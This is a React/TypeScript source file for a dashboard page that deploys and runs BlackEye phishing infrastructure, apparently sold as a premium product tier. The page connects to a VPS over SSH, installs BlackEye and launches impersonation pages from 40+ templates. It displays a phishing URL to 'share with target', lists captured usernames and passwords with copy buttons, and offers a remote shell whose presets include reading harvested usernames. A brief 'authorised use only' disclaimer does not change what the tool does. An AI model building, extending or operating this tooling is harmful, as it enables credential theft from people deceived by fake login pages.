/**
 * BlackEye Page — Phishing page infrastructure management
 * Titan-tier exclusive feature under the Specialised category.
 *
 * Uses EricksonAtHome/blackeye fork (latest 2025) with 40+ templates.
 */
import React, { useState, useEffect } from "react";
import { trpc } from "@/lib/trpc";
import { toast } from "sonner";
import {
  Card,
  CardContent,
  CardHeader,
  CardTitle,
} from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Badge } from "@/components/ui/badge";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import {
  Eye,
  EyeOff,
  Server,
  Wifi,
  WifiOff,
  Play,
  Square,
  RefreshCw,
  Download,
  Key,
  FileText,
  Settings,
  Copy,
  ExternalLink,
  Shield,
  Terminal,
  AlertTriangle,
  CheckCircle,
  Clock,
  Zap,
  Package,
  Search,
} from "lucide-react";

// ─── Template Categories ──────────────────────────────────────────
const CATEGORIES = [
  "All",
  "Social Media",
  "Email / Accounts",
  "Financial",
  "Gaming",
  "Streaming",
  "Cloud Storage",
  "Developer",
  "E-Commerce",
  "CMS",
  "Creative",
  "Custom",
];

// ─── Connection Setup Dialog ──────────────────────────────────────
function ConnectionSetup({
  open,
  onClose,
  onSave,
}: {
  open: boolean;
  onClose: () => void;
  onSave: () => void;
}) {
  const [host, setHost] = useState("");
  const [port, setPort] = useState("22");
  const [username, setUsername] = useState("root");
  const [authType, setAuthType] = useState<"password" | "key">("password");
  const [password, setPassword] = useState("");
  const [privateKey, setPrivateKey] = useState("");
  const [testing, setTesting] = useState(false);
  const [testResult, setTestResult] = useState<{ success: boolean; message: string } | null>(null);

  const testConnection = trpc.blackeye.testConnection.useMutation();
  const saveConnection = trpc.blackeye.saveConnection.useMutation();

  const handleTest = async () => {
    setTesting(true);
    setTestResult(null);
    try {
      const result = await testConnection.mutateAsync({
        host,
        port: parseInt(port),
        username,
        password: authType === "password" ? password : undefined,
        privateKey: authType === "key" ? privateKey : undefined,
      });
      setTestResult(result);
    } catch (err: any) {
      setTestResult({ success: false, message: err.message });
    }
    setTesting(false);
  };

  const handleSave = async () => {
    try {
      await saveConnection.mutateAsync({
        host,
        port: parseInt(port),
        username,
        password: authType === "password" ? password : undefined,
        privateKey: authType === "key" ? privateKey : undefined,
      });
      toast.success("Connection saved");
      onSave();
      onClose();
    } catch (err: any) {
      toast.error(err.message);
    }
  };

  return (
    <Dialog open={open} onOpenChange={onClose}>
      <DialogContent className="bg-zinc-900 border-zinc-800 max-w-lg">
        <DialogHeader>
          <DialogTitle className="text-white flex items-center gap-2">
            <Server className="w-5 h-5 text-orange-400" />
            Connect to BlackEye Server
          </DialogTitle>
          <DialogDescription>
            Enter the SSH credentials for the VPS where BlackEye will be deployed.
            All credentials are AES-256 encrypted at rest.
          </DialogDescription>
        </DialogHeader>
        <div className="space-y-4">
          <div className="grid grid-cols-3 gap-3">
            <div className="col-span-2">
              <Label className="text-zinc-400">Host / IP</Label>
              <Input
                value={host}
                onChange={(e) => setHost(e.target.value)}
                placeholder="123.45.67.89"
                className="bg-zinc-800 border-zinc-700 text-white"
              />
            </div>
            <div>
              <Label className="text-zinc-400">Port</Label>
              <Input
                value={port}
                onChange={(e) => setPort(e.target.value)}
                placeholder="22"
                className="bg-zinc-800 border-zinc-700 text-white"
              />
            </div>
          </div>
          <div>
            <Label className="text-zinc-400">Username</Label>
            <Input
              value={username}
              onChange={(e) => setUsername(e.target.value)}
              placeholder="root"
              className="bg-zinc-800 border-zinc-700 text-white"
            />
          </div>
          <div>
            <Label className="text-zinc-400">Authentication</Label>
            <div className="flex gap-2 mt-1">
              <Button
                size="sm"
                variant={authType === "password" ? "default" : "outline"}
                onClick={() => setAuthType("password")}
                className={authType === "password" ? "bg-orange-600" : "border-zinc-700"}
              >
                <Key className="w-3 h-3 mr-1" /> Password
              </Button>
              <Button
                size="sm"
                variant={authType === "key" ? "default" : "outline"}
                onClick={() => setAuthType("key")}
                className={authType === "key" ? "bg-orange-600" : "border-zinc-700"}
              >
                <FileText className="w-3 h-3 mr-1" /> SSH Key
              </Button>
            </div>
          </div>
          {authType === "password" ? (
            <div>
              <Label className="text-zinc-400">Password</Label>
              <Input
                type="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder="Enter SSH password"
                className="bg-zinc-800 border-zinc-700 text-white"
              />
            </div>
          ) : (
            <div>
              <Label className="text-zinc-400">Private Key</Label>
              <textarea
                value={privateKey}
                onChange={(e) => setPrivateKey(e.target.value)}
                placeholder="-----BEGIN OPENSSH PRIVATE KEY-----"
                className="w-full h-24 bg-zinc-800 border border-zinc-700 text-white text-xs rounded-md p-2 font-mono resize-none"
              />
            </div>
          )}
          {testResult && (
            <div className={`flex items-center gap-2 text-sm p-3 rounded-lg ${testResult.success ? "bg-emerald-500/10 text-emerald-400" : "bg-red-500/10 text-red-400"}`}>
              {testResult.success ? <CheckCircle className="w-4 h-4" /> : <AlertTriangle className="w-4 h-4" />}
              {testResult.message}
            </div>
          )}
          <div className="flex gap-2 pt-2">
            <Button
              variant="outline"
              className="border-zinc-700 flex-1"
              onClick={handleTest}
              disabled={testing || !host}
            >
              {testing ? <RefreshCw className="w-4 h-4 mr-2 animate-spin" /> : <Wifi className="w-4 h-4 mr-2" />}
              Test Connection
            </Button>
            <Button
              className="bg-orange-600 hover:bg-orange-700 flex-1"
              onClick={handleSave}
              disabled={!host || (!password && !privateKey)}
            >
              Save & Connect
            </Button>
          </div>
        </div>
      </DialogContent>
    </Dialog>
  );
}

// ─── Main Page ────────────────────────────────────────────────────
export default function BlackEyePage() {
  const [showSetup, setShowSetup] = useState(false);
  const [connected, setConnected] = useState(false);
  const [activeTab, setActiveTab] = useState("templates");
  const [selectedTemplate, setSelectedTemplate] = useState<string | null>(null);
  const [selectedCategory, setSelectedCategory] = useState("All");
  const [searchQuery, setSearchQuery] = useState("");
  const [launchPort, setLaunchPort] = useState("80");
  const [customDomain, setCustomDomain] = useState("");
  const [activeSession, setActiveSession] = useState<{
    phishingUrl: string;
    template: string;
    logFile: string;
  } | null>(null);
  const [terminalOutput, setTerminalOutput] = useState("");
  const [terminalCommand, setTerminalCommand] = useState("");
  const [showPassword, setShowPassword] = useState(false);

  // tRPC queries and mutations
  const templatesQuery = trpc.blackeye.listTemplates.useQuery(undefined);
  const connectionQuery = trpc.blackeye.getConnection.useQuery(undefined);
  const statusMutation = trpc.blackeye.getStatus.useMutation();
  const installMutation = trpc.blackeye.install.useMutation();
  const launchMutation = trpc.blackeye.launch.useMutation();
  const stopMutation = trpc.blackeye.stop.useMutation();
  const capturedMutation = trpc.blackeye.getCaptured.useMutation();
  const logsMutation = trpc.blackeye.getLogs.useMutation();
  const updateMutation = trpc.blackeye.update.useMutation();
  const commandMutation = trpc.blackeye.runCommand.useMutation();

  const templates = templatesQuery.data?.templates || [];
  // Update connected state based on query results
  useEffect(() => {
    if (templatesQuery.isSuccess) setConnected(true);
    if (templatesQuery.isError) setConnected(false);
  }, [templatesQuery.isSuccess, templatesQuery.isError]);
  useEffect(() => {
    if (connectionQuery.data !== undefined) setConnected(!!connectionQuery.data);
  }, [connectionQuery.data]);
  const connection = connectionQuery.data;

  const filteredTemplates = templates.filter(t => {
    const matchesCategory = selectedCategory === "All" || t.category === selectedCategory;
    const matchesSearch = !searchQuery || t.name.toLowerCase().includes(searchQuery.toLowerCase());
    return matchesCategory && matchesSearch;
  });

  const handleInstall = async () => {
    try {
      toast.loading("Installing BlackEye...", { id: "install" });
      const result = await installMutation.mutateAsync();
      toast.success("BlackEye installed successfully", { id: "install" });
      setTerminalOutput(result.output);
    } catch (err: any) {
      toast.error(err.message, { id: "install" });
    }
  };

  const handleLaunch = async () => {
    if (!selectedTemplate) {
      toast.error("Please select a template first");
      return;
    }
    try {
      toast.loading("Launching phishing page...", { id: "launch" });
      const result = await launchMutation.mutateAsync({
        template: selectedTemplate,
        port: parseInt(launchPort) || 80,
        customDomain: customDomain || undefined,
      });
      setActiveSession(result);
      toast.success("Phishing page launched", { id: "launch" });
      setActiveTab("live");
    } catch (err: any) {
      toast.error(err.message, { id: "launch" });
    }
  };

  const handleStop = async () => {
    try {
      await stopMutation.mutateAsync();
      setActiveSession(null);
      toast.success("BlackEye stopped");
    } catch (err: any) {
      toast.error(err.message);
    }
  };

  const handleGetCaptured = async () => {
    try {
      const result = await capturedMutation.mutateAsync({
        logFile: activeSession?.logFile,
      });
      setTerminalOutput(result.raw);
    } catch (err: any) {
      toast.error(err.message);
    }
  };

  const handleGetLogs = async () => {
    try {
      const result = await logsMutation.mutateAsync({ lines: 100 });
      setTerminalOutput(result.output);
    } catch (err: any) {
      toast.error(err.message);
    }
  };

  const handleRunCommand = async () => {
    if (!terminalCommand.trim()) return;
    try {
      const result = await commandMutation.mutateAsync({ command: terminalCommand });
      setTerminalOutput(prev => `$ ${terminalCommand}\n${result.output}\n\n${prev}`);
      setTerminalCommand("");
    } catch (err: any) {
      toast.error(err.message);
    }
  };

  return (
    <div className="max-w-6xl mx-auto p-6 space-y-6">
      {/* Header */}
      <div className="flex flex-col gap-3 sm:flex-row sm:items-center sm:justify-between">
        <div className="flex items-center gap-4">
          <div className="bg-orange-500/10 rounded-xl p-3">
            <Eye className="w-8 h-8 text-orange-400" />
          </div>
          <div>
            <h1 className="text-2xl font-bold text-white flex items-center gap-2">
              BlackEye
              <Badge className="bg-orange-500/20 text-orange-400 border-orange-500/30 text-xs">Latest 2025</Badge>
              <Badge className="bg-amber-500/20 text-amber-400 border-amber-500/30 text-xs">Titan</Badge>
            </h1>
            <p className="text-zinc-500">
              Credential harvesting infrastructure with 40+ phishing templates
            </p>
          </div>
        </div>
        <div className="flex items-center gap-3">
          {connection ? (
            <div className="flex items-center gap-2">
              <Badge className="bg-emerald-500/20 text-emerald-400 border-emerald-500/30">
                <Wifi className="w-3 h-3 mr-1" />
                {connection.host}:{connection.port}
              </Badge>
              {activeSession && (
                <Badge className="bg-orange-500/20 text-orange-400 border-orange-500/30 animate-pulse">
                  <Zap className="w-3 h-3 mr-1" />
                  Live
                </Badge>
              )}
              <Button size="sm" variant="outline" className="border-zinc-700" onClick={() => setShowSetup(true)}>
                <Settings className="w-4 h-4" />
              </Button>
            </div>
          ) : (
            <Button onClick={() => setShowSetup(true)} className="bg-orange-600 hover:bg-orange-700">
              <Server className="w-4 h-4 mr-2" /> Connect Server
            </Button>
          )}
        </div>
      </div>

      {/* Disclaimer */}
      <Card className="bg-amber-500/5 border-amber-500/20">
        <CardContent className="p-4 flex items-start gap-3">
          <AlertTriangle className="w-5 h-5 text-amber-400 mt-0.5 flex-shrink-0" />
          <p className="text-sm text-amber-300/80">
            <strong className="text-amber-300">Authorised Use Only.</strong> BlackEye is a security research and penetration testing tool.
            Only deploy against systems and individuals for which you have explicit written authorisation.
            Unauthorised use is illegal and may result in criminal prosecution.
          </p>
        </CardContent>
      </Card>

      {/* Not Connected State */}
      {!connection && (
        <Card className="bg-zinc-900/50 border-zinc-800">
          <CardContent className="p-12 text-center">
            <WifiOff className="w-16 h-16 text-zinc-600 mx-auto mb-4" />
            <h2 className="text-xl font-semibold text-white mb-2">No Server Connected</h2>
            <p className="text-zinc-500 max-w-md mx-auto mb-6">
              Connect to a VPS via SSH to deploy BlackEye phishing pages.
              The server will host the credential harvesting pages.
            </p>
            <div className="space-y-3 text-left max-w-sm mx-auto mb-6">
              {[
                "Deploy a VPS (Ubuntu 20.04+ recommended)",
                "Enter your SSH credentials to connect",
                "Install BlackEye with one click",
                "Launch any of 40+ phishing templates",
              ].map((step, i) => (
                <div key={i} className="flex items-start gap-3 text-sm">
                  <div className="bg-orange-500/10 rounded-full p-1 mt-0.5 flex-shrink-0">
                    <span className="text-orange-400 text-xs font-bold w-4 h-4 flex items-center justify-center">{i + 1}</span>
                  </div>
                  <p className="text-zinc-400">{step}</p>
                </div>
              ))}
            </div>
            <Button onClick={() => setShowSetup(true)} className="bg-orange-600 hover:bg-orange-700">
              <Server className="w-4 h-4 mr-2" /> Connect Your Server
            </Button>
          </CardContent>
        </Card>
      )}

      {/* Main Dashboard */}
      {connection && (
        <Tabs value={activeTab} onValueChange={setActiveTab}>
          <TabsList className="bg-zinc-900 border border-zinc-800 p-1">
            <TabsTrigger value="templates" className="data-[state=active]:bg-zinc-800 data-[state=active]:text-white">
              <Package className="w-4 h-4 mr-2" /> Templates
            </TabsTrigger>
            <TabsTrigger value="live" className="data-[state=active]:bg-zinc-800 data-[state=active]:text-white">
              <Zap className="w-4 h-4 mr-2" /> Live Session
              {activeSession && <span className="ml-1 w-2 h-2 bg-orange-400 rounded-full animate-pulse inline-block" />}
            </TabsTrigger>
            <TabsTrigger value="captured" className="data-[state=active]:bg-zinc-800 data-[state=active]:text-white">
              <Eye className="w-4 h-4 mr-2" /> Captured
            </TabsTrigger>
            <TabsTrigger value="terminal" className="data-[state=active]:bg-zinc-800 data-[state=active]:text-white">
              <Terminal className="w-4 h-4 mr-2" /> Terminal
            </TabsTrigger>
            <TabsTrigger value="server" className="data-[state=active]:bg-zinc-800 data-[state=active]:text-white">
              <Server className="w-4 h-4 mr-2" /> Server
            </TabsTrigger>
          </TabsList>

          {/* Templates Tab */}
          <TabsContent value="templates" className="space-y-4">
            {/* Search and Filter */}
            <div className="flex gap-3">
              <div className="relative flex-1">
                <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-zinc-500" />
                <Input
                  value={searchQuery}
                  onChange={(e) => setSearchQuery(e.target.value)}
                  placeholder="Search templates..."
                  className="bg-zinc-900 border-zinc-800 text-white pl-9"
                />
              </div>
              <Select value={selectedCategory} onValueChange={setSelectedCategory}>
                <SelectTrigger className="w-48 bg-zinc-900 border-zinc-800 text-white">
                  <SelectValue />
                </SelectTrigger>
                <SelectContent className="bg-zinc-900 border-zinc-800">
                  {CATEGORIES.map(cat => (
                    <SelectItem key={cat} value={cat} className="text-white hover:bg-zinc-800">{cat}</SelectItem>
                  ))}
                </SelectContent>
              </Select>
            </div>

            {/* Template Grid */}
            <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-3">
              {filteredTemplates.map((template) => (
                <Card
                  key={template.id}
                  className={`cursor-pointer transition-all border-2 ${
                    selectedTemplate === template.id
                      ? "border-orange-500 bg-orange-500/10"
                      : "border-zinc-800 bg-zinc-900/50 hover:border-zinc-700"
                  }`}
                  onClick={() => setSelectedTemplate(template.id)}
                >
                  <CardContent className="p-4 text-center">
                    <div className="text-3xl mb-2">{template.icon}</div>
                    <p className="text-white text-sm font-medium">{template.name}</p>
                    <p className="text-zinc-500 text-xs mt-1">{template.category}</p>
                    {selectedTemplate === template.id && (
                      <Badge className="mt-2 bg-orange-500/20 text-orange-400 border-orange-500/30 text-xs">
                        Selected
                      </Badge>
                    )}
                  </CardContent>
                </Card>
              ))}
            </div>

            {/* Launch Controls */}
            {selectedTemplate && (
              <Card className="bg-zinc-900/50 border-zinc-800">
                <CardHeader>
                  <CardTitle className="text-white text-base flex items-center gap-2">
                    <Play className="w-4 h-4 text-orange-400" />
                    Launch Configuration
                  </CardTitle>
                </CardHeader>
                <CardContent className="space-y-4">
                  <div className="grid grid-cols-2 gap-4">
                    <div>
                      <Label className="text-zinc-400">Port</Label>
                      <Input
                        value={launchPort}
                        onChange={(e) => setLaunchPort(e.target.value)}
                        placeholder="80"
                        className="bg-zinc-800 border-zinc-700 text-white"
                      />
                    </div>
                    <div>
                      <Label className="text-zinc-400">Custom Domain (optional)</Label>
                      <Input
                        value={customDomain}
                        onChange={(e) => setCustomDomain(e.target.value)}
                        placeholder="phish.yourdomain.com"
                        className="bg-zinc-800 border-zinc-700 text-white"
                      />
                    </div>
                  </div>
                  <div className="flex gap-3">
                    <Button
                      className="bg-orange-600 hover:bg-orange-700 flex-1"
                      onClick={handleLaunch}
                      disabled={launchMutation.isPending}
                    >
                      {launchMutation.isPending ? (
                        <RefreshCw className="w-4 h-4 mr-2 animate-spin" />
                      ) : (
                        <Play className="w-4 h-4 mr-2" />
                      )}
                      Launch {templates.find(t => t.id === selectedTemplate)?.name} Page
                    </Button>
                    {activeSession && (
                      <Button
                        variant="outline"
                        className="border-red-700 text-red-400 hover:bg-red-500/10"
                        onClick={handleStop}
                        disabled={stopMutation.isPending}
                      >
                        <Square className="w-4 h-4 mr-2" /> Stop
                      </Button>
                    )}
                  </div>
                </CardContent>
              </Card>
            )}
          </TabsContent>

          {/* Live Session Tab */}
          <TabsContent value="live" className="space-y-4">
            {!activeSession ? (
              <Card className="bg-zinc-900/50 border-zinc-800">
                <CardContent className="p-12 text-center">
                  <Zap className="w-12 h-12 text-zinc-600 mx-auto mb-4" />
                  <h3 className="text-white font-semibold mb-2">No Active Session</h3>
                  <p className="text-zinc-500 text-sm">Select a template and launch a phishing page to see it here.</p>
                </CardContent>
              </Card>
            ) : (
              <div className="space-y-4">
                <Card className="bg-zinc-900/50 border-zinc-800">
                  <CardHeader>
                    <CardTitle className="text-white text-base flex items-center gap-2">
                      <Zap className="w-4 h-4 text-orange-400" />
                      Active Phishing Session
                      <Badge className="bg-orange-500/20 text-orange-400 border-orange-500/30 animate-pulse">Live</Badge>
                    </CardTitle>
                  </CardHeader>
                  <CardContent className="space-y-4">
                    <div className="grid grid-cols-2 gap-4">
                      <div>
                        <p className="text-zinc-500 text-xs mb-1">Template</p>
                        <p className="text-white font-medium capitalize">{activeSession.template}</p>
                      </div>
                      <div>
                        <p className="text-zinc-500 text-xs mb-1">Server IP</p>
                        <p className="text-white font-mono text-sm">{activeSession.phishingUrl}</p>
                      </div>
                    </div>
                    <div className="bg-zinc-800/50 rounded-lg p-4">
                      <p className="text-zinc-400 text-xs mb-2">Phishing URL (share with target)</p>
                      <div className="flex items-center gap-2">
                        <code className="text-orange-400 font-mono text-sm flex-1 break-all">
                          {activeSession.phishingUrl}
                        </code>
                        <Button
                          size="sm"
                          variant="outline"
                          className="border-zinc-700"
                          onClick={() => {
                            navigator.clipboard.writeText(activeSession.phishingUrl);
                            toast.success("URL copied");
                          }}
                        >
                          <Copy className="w-3 h-3" />
                        </Button>
                        <Button
                          size="sm"
                          variant="outline"
                          className="border-zinc-700"
                          onClick={() => window.open(activeSession.phishingUrl, "_blank")}
                        >
                          <ExternalLink className="w-3 h-3" />
                        </Button>
                      </div>
                    </div>
                    <div className="flex gap-3">
                      <Button
                        variant="outline"
                        className="border-zinc-700"
                        onClick={handleGetLogs}
                        disabled={logsMutation.isPending}
                      >
                        <RefreshCw className={`w-4 h-4 mr-2 ${logsMutation.isPending ? "animate-spin" : ""}`} />
                        Refresh Logs
                      </Button>
                      <Button
                        variant="outline"
                        className="border-zinc-700"
                        onClick={handleGetCaptured}
                      >
                        <Eye className="w-4 h-4 mr-2" />
                        Check Captures
                      </Button>
                      <Button
                        variant="outline"
                        className="border-red-700 text-red-400 hover:bg-red-500/10 ml-auto"
                        onClick={handleStop}
                        disabled={stopMutation.isPending}
                      >
                        <Square className="w-4 h-4 mr-2" /> Stop Session
                      </Button>
                    </div>
                    {terminalOutput && (
                      <div className="bg-zinc-950 rounded-lg p-4 font-mono text-xs text-green-400 max-h-64 overflow-y-auto whitespace-pre-wrap">
                        {terminalOutput}
                      </div>
                    )}
                  </CardContent>
                </Card>
              </div>
            )}
          </TabsContent>

          {/* Captured Credentials Tab */}
          <TabsContent value="captured" className="space-y-4">
            <Card className="bg-zinc-900/50 border-zinc-800">
              <CardHeader className="flex flex-row items-center justify-between">
                <CardTitle className="text-white text-base flex items-center gap-2">
                  <Eye className="w-4 h-4 text-orange-400" />
                  Captured Credentials
                </CardTitle>
                <Button
                  size="sm"
                  variant="outline"
                  className="border-zinc-700"
                  onClick={handleGetCaptured}
                  disabled={capturedMutation.isPending}
                >
                  <RefreshCw className={`w-4 h-4 mr-2 ${capturedMutation.isPending ? "animate-spin" : ""}`} />
                  Refresh
                </Button>
              </CardHeader>
              <CardContent>
                {capturedMutation.data?.captures && capturedMutation.data.captures.length > 0 ? (
                  <div className="space-y-2">
                    {capturedMutation.data.captures.map((capture) => (
                      <div key={capture.id} className="bg-zinc-800/50 rounded-lg p-3 flex items-center justify-between">
                        <div>
                          <p className="text-white text-sm font-medium">{capture.username}</p>
                          <div className="flex items-center gap-2 mt-1">
                            <p className="text-zinc-500 text-xs font-mono">
                              {showPassword ? capture.password : "••••••••"}
                            </p>
                            <Button
                              size="sm"
                              variant="ghost"
                              className="h-4 w-4 p-0"
                              onClick={() => setShowPassword(!showPassword)}
                            >
                              {showPassword ? <EyeOff className="w-3 h-3 text-zinc-500" /> : <Eye className="w-3 h-3 text-zinc-500" />}
                            </Button>
                          </div>
                        </div>
                        <div className="flex items-center gap-2">
                          <Badge className="bg-zinc-800 text-zinc-400 border-zinc-700 text-xs">
                            <Clock className="w-3 h-3 mr-1" />
                            {new Date(capture.capturedAt).toLocaleTimeString()}
                          </Badge>
                          <Button
                            size="sm"
                            variant="outline"
                            className="border-zinc-700 h-7"
                            onClick={() => {
                              navigator.clipboard.writeText(`${capture.username}:${capture.password}`);
                              toast.success("Copied");
                            }}
                          >
                            <Copy className="w-3 h-3" />
                          </Button>
                        </div>
                      </div>
                    ))}
                  </div>
                ) : (
                  <div className="text-center py-12">
                    <Eye className="w-12 h-12 text-zinc-600 mx-auto mb-4" />
                    <p className="text-zinc-500">No captures yet. Launch a phishing page and wait for targets.</p>
                    <Button
                      size="sm"
                      variant="outline"
                      className="border-zinc-700 mt-4"
                      onClick={handleGetCaptured}
                    >
                      Check for Captures
                    </Button>
                  </div>
                )}
              </CardContent>
            </Card>
          </TabsContent>

          {/* Terminal Tab */}
          <TabsContent value="terminal" className="space-y-4">
            <Card className="bg-zinc-900/50 border-zinc-800">
              <CardHeader>
                <CardTitle className="text-white text-base flex items-center gap-2">
                  <Terminal className="w-4 h-4 text-orange-400" />
                  SSH Terminal
                </CardTitle>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="bg-zinc-950 rounded-lg p-4 font-mono text-xs text-green-400 min-h-48 max-h-96 overflow-y-auto whitespace-pre-wrap">
                  {terminalOutput || "# BlackEye SSH Terminal\n# Enter commands below to execute on the remote server\n"}
                </div>
                <div className="flex gap-2">
                  <Input
                    value={terminalCommand}
                    onChange={(e) => setTerminalCommand(e.target.value)}
                    onKeyDown={(e) => e.key === "Enter" && handleRunCommand()}
                    placeholder="Enter command..."
                    className="bg-zinc-800 border-zinc-700 text-white font-mono text-sm"
                  />
                  <Button
                    className="bg-orange-600 hover:bg-orange-700"
                    onClick={handleRunCommand}
                    disabled={commandMutation.isPending || !terminalCommand.trim()}
                  >
                    {commandMutation.isPending ? <RefreshCw className="w-4 h-4 animate-spin" /> : <Play className="w-4 h-4" />}
                  </Button>
                </div>
                <div className="flex gap-2 flex-wrap">
                  {[
                    "ls /opt/blackeye",
                    "cat /opt/blackeye/sites/*/usernames.txt",
                    "ps aux | grep blackeye",
                    "netstat -tlnp | grep :80",
                  ].map(cmd => (
                    <Button
                      key={cmd}
                      size="sm"
                      variant="outline"
                      className="border-zinc-700 text-zinc-400 text-xs font-mono"
                      onClick={() => setTerminalCommand(cmd)}
                    >
                      {cmd}
                    </Button>
                  ))}
                </div>
              </CardContent>
            </Card>
          </TabsContent>

          {/* Server Tab */}
          <TabsContent value="server" className="space-y-4">
            <div className="grid grid-cols-2 gap-4">
              <Card className="bg-zinc-900/50 border-zinc-800">
                <CardHeader>
                  <CardTitle className="text-white text-base flex items-center gap-2">
                    <Package className="w-4 h-4 text-orange-400" />
                    Installation
                  </CardTitle>
                </CardHeader>
                <CardContent className="space-y-3">
                  <p className="text-zinc-400 text-sm">
                    Install the latest BlackEye (EricksonAtHome fork, 2025) with 40+ templates.
                  </p>
                  <Button
                    className="w-full bg-orange-600 hover:bg-orange-700"
                    onClick={handleInstall}
                    disabled={installMutation.isPending}
                  >
                    {installMutation.isPending ? (
                      <RefreshCw className="w-4 h-4 mr-2 animate-spin" />
                    ) : (
                      <Download className="w-4 h-4 mr-2" />
                    )}
                    Install BlackEye
                  </Button>
                  <Button
                    variant="outline"
                    className="w-full border-zinc-700"
                    onClick={() => updateMutation.mutateAsync().then(r => setTerminalOutput(r.output))}
                    disabled={updateMutation.isPending}
                  >
                    <RefreshCw className={`w-4 h-4 mr-2 ${updateMutation.isPending ? "animate-spin" : ""}`} />
                    Update to Latest
                  </Button>
                </CardContent>
              </Card>
              <Card className="bg-zinc-900/50 border-zinc-800">
                <CardHeader>
                  <CardTitle className="text-white text-base flex items-center gap-2">
                    <Shield className="w-4 h-4 text-orange-400" />
                    Server Status
                  </CardTitle>
                </CardHeader>
                <CardContent className="space-y-3">
                  <Button
                    variant="outline"
                    className="w-full border-zinc-700"
                    onClick={() => statusMutation.mutateAsync().then(r => setTerminalOutput(r.lastCommit || "Status checked"))}
                    disabled={statusMutation.isPending}
                  >
                    <RefreshCw className={`w-4 h-4 mr-2 ${statusMutation.isPending ? "animate-spin" : ""}`} />
                    Check Status
                  </Button>
                  {statusMutation.data && (
                    <div className="space-y-2">
                      <div className="flex items-center justify-between">
                        <span className="text-zinc-400 text-sm">Installed</span>
                        <Badge className={statusMutation.data.installed ? "bg-emerald-500/20 text-emerald-400 border-emerald-500/30" : "bg-red-500/20 text-red-400 border-red-500/30"}>
                          {statusMutation.data.installed ? "Yes" : "No"}
                        </Badge>
                      </div>
                      <div className="flex items-center justify-between">
                        <span className="text-zinc-400 text-sm">Templates</span>
                        <span className="text-white text-sm">{statusMutation.data.templateCount}</span>
                      </div>
                      <div className="flex items-center justify-between">
                        <span className="text-zinc-400 text-sm">Running</span>
                        <Badge className={statusMutation.data.running ? "bg-orange-500/20 text-orange-400 border-orange-500/30 animate-pulse" : "bg-zinc-800 text-zinc-400 border-zinc-700"}>
                          {statusMutation.data.running ? "Active" : "Stopped"}
                        </Badge>
                      </div>
                      <div className="flex items-center justify-between">
                        <span className="text-zinc-400 text-sm">Last Commit</span>
                        <span className="text-zinc-500 text-xs font-mono">{statusMutation.data.lastCommit}</span>
                      </div>
                    </div>
                  )}
                </CardContent>
              </Card>
            </div>
            {terminalOutput && (
              <Card className="bg-zinc-900/50 border-zinc-800">
                <CardContent className="p-4">
                  <div className="bg-zinc-950 rounded-lg p-4 font-mono text-xs text-green-400 max-h-64 overflow-y-auto whitespace-pre-wrap">
                    {terminalOutput}
                  </div>
                </CardContent>
              </Card>
            )}
          </TabsContent>
        </Tabs>
      )}

      {/* Connection Setup Dialog */}
      <ConnectionSetup
        open={showSetup}
        onClose={() => setShowSetup(false)}
        onSave={() => {
          connectionQuery.refetch();
          templatesQuery.refetch();
        }}
      />
    </div>
  );
}
